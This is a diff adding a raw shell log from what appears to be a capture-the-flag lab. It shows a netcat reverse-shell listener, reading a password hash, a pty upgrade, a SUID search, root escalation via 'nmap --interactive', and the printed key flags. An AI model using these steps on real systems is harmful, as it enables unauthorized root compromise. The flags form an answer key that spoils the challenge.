@@ -1,0 +1,231 @@
+nc -lvnp 9001                                                                                            ─╯
+listening on [any] 9001 ...
+connect to [10.8.62.212] from (UNKNOWN) [10.10.47.25] 39090
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 19:17:34 up  1:02,  0 users,  load average: 0.00, 0.01, 0.29
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+bash: cannot set terminal process group (2153): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@linux:/$ ls
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+daemon@linux:/$ cd home
+cd home
+daemon@linux:/home$ ls
+ls
+robot
+daemon@linux:/home$ cat robot
+cat robot
+cat: robot: Is a directory
+daemon@linux:/home$ cd robot
+cd robot
+daemon@linux:/home/robot$ ls
+ls
+key-2-of-3.txt
+password.raw-md5
+daemon@linux:/home/robot$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+daemon@linux:/home/robot$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+daemon@linux:/home/robot$ su robot
+su robot
+su: must be run from a terminal
+daemon@linux:/home/robot$ cd ..
+cd ..
+daemon@linux:/home$ su robot
+su robot
+su: must be run from a terminal
+daemon@linux:/home$ sudo su
+sudo su
+sudo: no tty present and no askpass program specified
+daemon@linux:/home$ su
+su
+su: must be run from a terminal
+daemon@linux:/home$ sudo -u robot -i
+sudo -u robot -i
+sudo: no tty present and no askpass program specified
+daemon@linux:/home$ script /dev/null -c "su robot"
+script /dev/null -c "su robot"
+Password: 
+su: Authentication failure
+Script started, file is /dev/null
+Script started, file is /dev/null
+Script done, file is /dev/null
+daemon@linux:/home$ python --version
+python --version
+Python 2.7.6
+daemon@linux:/home$ python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+daemon@linux:/home$ su robot
+su robot
+Password: script /dev/null -c "su robot"
+
+su: Authentication failure
+daemon@linux:/home$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:/home$ whoami
+whoami
+robot
+robot@linux:/home$ cd robot
+cd robot
+robot@linux:~$ ls
+ls
+key-2-of-3.txt  password.raw-md5
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:~$ find / -perm +6000 2>/dev/null | grep '/bin/'
+find / -perm +6000 2>/dev/null | grep '/bin/'
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/mail-touchlock
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/screen
+/usr/bin/mail-unlock
+/usr/bin/mail-lock
+/usr/bin/chsh
+/usr/bin/crontab
+/usr/bin/chfn
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/expiry
+/usr/bin/dotlockfile
+/usr/bin/sudo
+/usr/bin/ssh-agent
+/usr/bin/wall
+/usr/local/bin/nmap
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> :sh
+:sh
+Unknown command (:sh) -- press h <enter> for help
+nmap> !sh
+!sh
+# whoami
+whoami
+root
+# ls
+ls
+key-2-of-3.txt  password.raw-md5
+# cd /root
+cd /root
+# ls
+ls
+firstboot_done  key-3-of-3.txt
+# cat firstboot_done
+cat firstboot_done
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+# python --version
+python --version
+Python 2.7.6
+# python 'import pty;pty.spawn("/bin/bash")'
+python 'import pty;pty.spawn("/bin/bash")'
+python: can't open file 'import pty;pty.spawn("/bin/bash")': [Errno 2] No such file or directory
+# echo $SHELL
+echo $SHELL
+/bin/bash
+# ls
+ls
+firstboot_done  key-3-of-3.txt
+# cd ..
+cd ..
+# ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
+boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
+# cd home
+cd home
+# ls
+ls
+robot
+# cd robot 
+cd robot
+# ls
+ls
+key-2-of-3.txt  password.raw-md5
+# cd ..
+cd ..
+# ls
+ls
+robot
+# cd ..
+cd ..
+# ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
+boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
+# cd mnt
+cd mnt
+# ls
+ls
+cdrom  hgfs
+# cd ..
+cd ..
+# cd /root
+cd /root
+# ls
+ls
+firstboot_done  key-3-of-3.txt
+# file firstboot_done
+file firstboot_done
+firstboot_done: empty 
+# cd firstboot_done
+cd firstboot_done
+sh: 27: cd: can't cd to firstboot_done
+# cat firstboot_done
+cat firstboot_done
+# ssh
+ssh
+usage: ssh [-1246AaCfgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec]
+           [-D [bind_address:]port] [-E log_file] [-e escape_char]
+           [-F configfile] [-I pkcs11] [-i identity_file]
+           [-L [bind_address:]port:host:hostport] [-l login_name] [-m mac_spec]
+           [-O ctl_cmd] [-o option] [-p port]
+           [-Q cipher | cipher-auth | mac | kex | key]
+           [-R [bind_address:]port:host:hostport] [-S ctl_path] [-W host:port]
+           [-w local_tun[:remote_tun]] [user@]hostname [command]
+# systemctl status ssh
+systemctl status ssh
+sh: 30: systemctl: not found
+# systemctl status sshd
+systemctl status sshd
+sh: 31: systemctl: not found
+# sshd
+sshd
+sshd re-exec requires execution with an absolute path
+# 
